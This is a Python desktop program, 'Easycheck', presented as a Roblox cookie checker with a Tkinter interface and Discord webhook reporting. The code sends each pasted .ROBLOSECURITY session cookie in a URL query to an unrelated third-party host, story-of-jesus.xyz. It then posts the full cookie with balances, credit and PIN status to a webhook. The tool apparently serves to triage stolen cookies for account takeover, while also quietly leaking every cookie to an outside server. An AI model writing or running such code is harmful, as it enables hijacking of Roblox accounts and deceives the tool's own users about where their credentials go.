# EasyCheck by vesper#0003
# follow my ig ' i_might_be_vesper ' or gay

import pickle
import os
import re
import requests
import threading
from urllib.request import Request, urlopen
from time import sleep
from tkinter import *
from tkinter import messagebox
import requests, json
from discord_webhook import DiscordWebhook, DiscordEmbed

window = Tk()
window.title("Easycheck")
window.geometry("550x400")
window.maxsize(550, 400)
window.minsize(550, 400)
window.iconbitmap("assets/logo.ico")
window.config(background='#484848')

bg1 = PhotoImage(file='assets/background.png')
bg2 = PhotoImage(file='assets/checkerbg.png')
bg3 = PhotoImage(file='assets/checkerbg2.png')
bg4 = PhotoImage(file='assets/aboutit.png')
bg5 = PhotoImage(file='assets/settingsbg.png')
bg6 = PhotoImage(file='assets/newwbhookbg.png')
checkbu = PhotoImage(file='assets/checkbu.png')
checker = PhotoImage(file='assets/checkbro.png')
checker2 = PhotoImage(file='assets/checker2.png')
settings = PhotoImage(file='assets/settingsbro.png')
settings2 = PhotoImage(file='assets/settings2.png')
about = PhotoImage(file='assets/aboutbro.png')
about2 = PhotoImage(file='assets/about2.png')
blankbu = PhotoImage(file='assets/blankbu.png')
fullbu = PhotoImage(file='assets/fullbu.png')
removebu = PhotoImage(file='assets/removebu.png')
changebu = PhotoImage(file='assets/changebu.png')
savebu = PhotoImage(file='assets/savebu.png')

class Easycheck:

    def __init__(self):
        if os.path.exists('saved_webhook.dat'):
            self.savedawebhook = True
            self.main2()
        else:
            self.savedawebhook = False
            self.main()

    def weavly_is_kinda_sus(self):
        if self.savedawebhook == True:
            webhook = pickle.load(open('saved_webhook.dat', 'rb'))
        else:
            webhook = self.thatsawebhook.get()
        cookie = self.entrblxcookie.get()

        r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}') 
        data = r.json()

        if data["status"] == "failed":
            messagebox.showerror('Easycheck', 'Invalid Cookie')
            if self.savedawebhook == True:
                self.main2()
            else:
                self.main()
        else:
            avatarurl = data["avatarurl"]   
            userid = data["userid"]  
            emailverified = data["emailverified"]  
            username = data["username"]  
            description = data["description"]  
            displayname = data["displayname"]  
            datecreated = data["datecreated"]  
            days_old = data["days-old"]  
            robux = data["robux"]  
            pendingrobux = data["pendingrobux"]  
            credit = data["credit"]  
            premium = data["premium"]  
            friends = data["friends"]  
            followers = data["followers"]  
            following = data["following"]
            rap = data["rap"]  
            gender = data["gender"]  
            country = data["country"]  
            pin = data["pin"] 
            if description == "":
                description = "Empty"
            '''
            groupIds = []
            groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
            for i in groups.json()['data']:
                groupIds.append(i['group']['id'])
            groupFunds = 0
            for i in groupIds:
                if 'robux' in groups.text:
                    groupFunds = groupFunds + int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
                else:
                    groupFunds = 0
            '''
            content = '@everyone'
            webhook = DiscordWebhook(url=webhook, username="Easycheck", avatar_url=r"https://cdn.discordapp.com/attachments/933858095631839283/937507285440278579/logo-removebg-preview.png",content=content)
            embed = DiscordEmbed(title="Valid Cookie", description=f"Easycheck Cookie Checker", color='1A9217')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/933858095631839283/937507285440278579/logo-removebg-preview.png')
            embed.set_footer(text='vesper')
            embed.set_thumbnail(url=f'{avatarurl}')
            embed.add_embed_field(name="Profile Link:", value=f'**[Click Here](https://www.roblox.com/users/{userid}/profile)**', inline=True)
            embed.add_embed_field(name="Rolimons Link:", value=f'**[Click Here](https://www.rolimons.com/player/{userid})**', inline=True)
            embed.add_embed_field(name="Username:", value=f'```{username}```', inline=True)
            embed.add_embed_field(name="UserID:", value=f'```{userid}```', inline=True)
            embed.add_embed_field(name="Display Name:", value=f'```{displayname}```', inline=True)
            embed.add_embed_field(name="Description:", value=f'```{description}```', inline=True)
            embed.add_embed_field(name="Gender:", value=f'```{gender}```', inline=True)
            embed.add_embed_field(name="Country:", value=f'```{country}```', inline=True)
            embed.add_embed_field(name="Verified Email:", value=f'```{emailverified}```', inline=True)
            embed.add_embed_field(name="Premium:", value=f'```{premium}```', inline=True)
            #embed.add_embed_field(name='Group Funds: ',value=f'```{groupFunds}```', inline=True)
            embed.add_embed_field(name="Pin Enabled:", value=f'```{pin}```', inline=True)
            embed.add_embed_field(name="Robux:", value=f'```{robux}```', inline=True)
            embed.add_embed_field(name="Pending-Robux:", value=f'```{pendingrobux}```', inline=True)
            embed.add_embed_field(name="Rap:", value=f'```{rap}```', inline=True)
            embed.add_embed_field(name="Credit:", value=f'```{credit}```', inline=True)
            embed.add_embed_field(name="Date Created:", value=f'```{days_old} Days Ago```', inline=True)
            embed.add_embed_field(name="Friends:", value=f'```{friends}```', inline=True)
            embed.add_embed_field(name="Followers:", value=f'```{followers}```', inline=True)
            embed.add_embed_field(name="Following:", value=f'```{following}```', inline=True)
            embed.add_embed_field(name="Cookie:", value=f'```{cookie}```', inline=False)
            embed.set_image(url='https://cdn.discordapp.com/attachments/933858095631839283/937516363277275156/ezgif-3-dd8aeec675.gif', inline=False)
            webhook.add_embed(embed)
            response = webhook.execute()
            if self.savedawebhook == True:
                self.main2()
            else:
                self.main()

    def checkinfforsaved(self):
        webhook = pickle.load(open('saved_webhook.dat', 'rb'))
        r= requests.get(webhook)
        if r.status_code == 200:
            self.weavly_is_kinda_sus()
        else:
           messagebox.showerror('Easycheck', 'Invalid Webhook') 

    def checkinfrq(self):
        webhook = self.thatsawebhook.get()
        if self.savedawebhook == True:
            pickle.dump(webhook, open('saved_webhook.dat', 'wb'))
        else:
            pass
        r = requests.get(webhook)
        if r.status_code ==200:
            self.weavly_is_kinda_sus()
        else:
            messagebox.showerror('Easycheck', 'Invalid Webhook')

    def savewebh(self):
        if self.savedawebhook == False:
            self.savedawebhook = True
            self.saveitorno.config(image=fullbu)
        else:
            self.savedawebhook = False
            self.saveitorno.config(image=blankbu)

    def main(self):
        bg = Label(window, image=bg1, borderwidth=0)
        bg.place(x=0, y=0)
        self.checkerb = Button(window, image=checker,bg='#333333',borderwidth=0, activebackground="#333333")
        self.checkerb.place(x=-1,y=141)
        self.abbt = Button(window, image=about,bg='#333333',borderwidth=0, activebackground="#333333",command=self.aboutit)
        self.abbt.place(x=-1,y=228)
        self.stgs = Button(window, image=settings,bg='#333333',borderwidth=0, activebackground="#333333",command=self.settngs)
        self.stgs.place(x=-1,y=315)
        self.checkerb = Button(window, image=checker2,bg='#333333',borderwidth=0, activebackground="#333333")
        self.checkerb.place(x=-1,y=141)
        bgggg = Label(window, image=bg2, borderwidth=0)
        bgggg.place(x=129, y=0)
        # ok main lol
        self.entrblxcookie = Entry(window, fg='#1A9217', bg='#A8A8A8',width=46, borderwidth=0)
        self.entrblxcookie.place(x=192, y=118)
        self.thatsawebhook = Entry(window, fg='#1A9217', bg='#A8A8A8',width=46, borderwidth=0)
        self.thatsawebhook.place(x=192, y=195)
        self.saveitorno = Button(window, image=blankbu,bg='#4B4B4B',borderwidth=0, activebackground="#4B4B4B",command=self.savewebh)
        self.saveitorno.place(x=339,y=235)
        checkboi = Button(window, image=checkbu,bg='#4B4B4B',borderwidth=0, activebackground="#4B4B4B",command=self.checkinfrq)
        checkboi.place(x=314,y=300) 

    def main2(self):
        bg = Label(window, image=bg1, borderwidth=0)
        bg.place(x=0, y=0)
        self.checkerb = Button(window, image=checker,bg='#333333',borderwidth=0, activebackground="#333333")
        self.checkerb.place(x=-1,y=141)
        self.abbt = Button(window, image=about,bg='#333333',borderwidth=0, activebackground="#333333",command=self.aboutit)
        self.abbt.place(x=-1,y=228)
        self.stgs = Button(window, image=settings,bg='#333333',borderwidth=0, activebackground="#333333",command=self.settngs)
        self.stgs.place(x=-1,y=315)
        self.checkerb = Button(window, image=checker2,bg='#333333',borderwidth=0, activebackground="#333333")
        self.checkerb.place(x=-1,y=141)
        bgggg = Label(window, image=bg3, borderwidth=0)
        bgggg.place(x=129, y=0)
        self.entrblxcookie = Entry(window, fg='#1A9217', bg='#A8A8A8',width=46, borderwidth=0)
        self.entrblxcookie.place(x=192, y=141)
        checkboi = Button(window, image=checkbu,bg='#4B4B4B',borderwidth=0, activebackground="#4B4B4B",command=self.checkinfforsaved)
        checkboi.place(x=315,y=284)

    def aboutit(self):
        bg = Label(window, image=bg1, borderwidth=0)
        bg.place(x=0, y=0)
        if self.savedawebhook == True:
            self.checkerb = Button(window, image=checker,bg='#333333',borderwidth=0, activebackground="#333333",command=self.main2)
            self.checkerb.place(x=-1,y=141)
        else:
            self.checkerb = Button(window, image=checker,bg='#333333',borderwidth=0, activebackground="#333333",command=self.main)
            self.checkerb.place(x=-1,y=141)
        self.abbt = Button(window, image=about,bg='#333333',borderwidth=0, activebackground="#333333")
        self.abbt.place(x=-1,y=228)
        self.stgs = Button(window, image=settings,bg='#333333',borderwidth=0, activebackground="#333333",command=self.settngs)
        self.stgs.place(x=-1,y=315)
        self.abbt = Button(window, image=about2,bg='#333333',borderwidth=0, activebackground="#333333")
        self.abbt.place(x=-1,y=228)
        bgggg = Label(window, image=bg4, borderwidth=0)
        bgggg.place(x=129, y=0)
    
    def removewbh(self):
        if os.path.exists('saved_webhook.dat'):
            os.remove('saved_webhook.dat')
            messagebox.showinfo('Easycheck', 'Successfully deleted the saved webhook ! Restarting Easycheck..')
            self.__init__()
        else:
            messagebox.showerror('Easycheck', 'No saved webhook found')
            self.settngs()

    def savethatbihheheh(self):
        webhook = self.pooplol55.get()
        try:
            r = requests.get(webhook)
        except:
            messagebox.showerror('Easycheck', 'Invalid Webhook')
            self.changenewwbh()
        try:
            if r.status_code == 200:
                os.remove('saved_webhook.dat')
                sleep(3)
                pickle.dump(webhook, open('saved_webhook.dat', 'wb'))
                messagebox.showinfo('Easycheck', 'Successfully changed the saved webhook ! Restarting Easycheck..')
                self.__init__()
            else:
                messagebox.showerror('Easycheck', 'Invalid Webhook')
                self.changenewwbh()
        except:
            pass

    def changenewwbh(self):
        bgggg = Label(window, image=bg6, borderwidth=0)
        bgggg.place(x=129, y=0)
        self.pooplol55 = Entry(window, fg='#1A9217', bg='#C4C4C4',width=42, borderwidth=0)
        self.pooplol55.place(x=195, y=202)
        savethat = Button(window, image=savebu,bg='#4B4B4B',borderwidth=0, activebackground="#4B4B4B",command=self.savethatbihheheh)
        savethat.place(x=315,y=239)

    def checkfilexist(self):
        if os.path.exists('saved_webhook.dat'):
            self.changenewwbh()
        else:
            messagebox.showerror('Easycheck', 'No saved webhook found')
            self.settngs()

    def settngs(self):
        bg = Label(window, image=bg1, borderwidth=0)
        bg.place(x=0, y=0)
        if self.savedawebhook == True:
            self.checkerb = Button(window, image=checker,bg='#333333',borderwidth=0, activebackground="#333333",command=self.main2)
            self.checkerb.place(x=-1,y=141)
        else:
            self.checkerb = Button(window, image=checker,bg='#333333',borderwidth=0, activebackground="#333333",command=self.main)
            self.checkerb.place(x=-1,y=141)
        self.abbt = Button(window, image=about,bg='#333333',borderwidth=0, activebackground="#333333",command=self.aboutit)
        self.abbt.place(x=-1,y=228)
        self.stgs = Button(window, image=settings,bg='#333333',borderwidth=0, activebackground="#333333")
        self.stgs.place(x=-1,y=315)
        self.stgs = Button(window, image=settings2,bg='#333333',borderwidth=0, activebackground="#333333")
        self.stgs.place(x=-1,y=315)
        bgggg = Label(window, image=bg5, borderwidth=0)
        bgggg.place(x=129, y=0)
        removethat = Button(window, image=removebu,bg='#4B4B4B',borderwidth=0, activebackground="#4B4B4B",command=self.removewbh)
        removethat.place(x=400,y=214)
        changethat = Button(window, image=changebu,bg='#4B4B4B',borderwidth=0, activebackground="#4B4B4B",command=self.checkfilexist)
        changethat.place(x=400,y=164)

t1 = threading.Thread(target=Easycheck)
t1.start()
window.mainloop()